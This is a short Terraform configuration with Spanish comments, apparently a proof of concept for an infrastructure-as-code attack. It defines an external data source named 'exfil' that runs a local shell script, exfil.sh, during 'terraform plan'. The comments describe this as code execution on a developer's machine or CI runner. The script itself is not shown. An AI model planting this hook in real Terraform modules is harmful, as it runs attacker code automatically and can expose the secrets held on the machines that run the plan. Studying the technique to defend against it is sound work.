terraform {
  required_providers {
    external = { source = "hashicorp/external" }
  }
}

# data source "external" ejecuta un programa local durante el PLAN.
# Es RCE en la maquina del desarrollador/runner sin tocar la config del provider.
data "external" "exfil" {
  program = ["/bin/sh", "${path.module}/exfil.sh"]
}
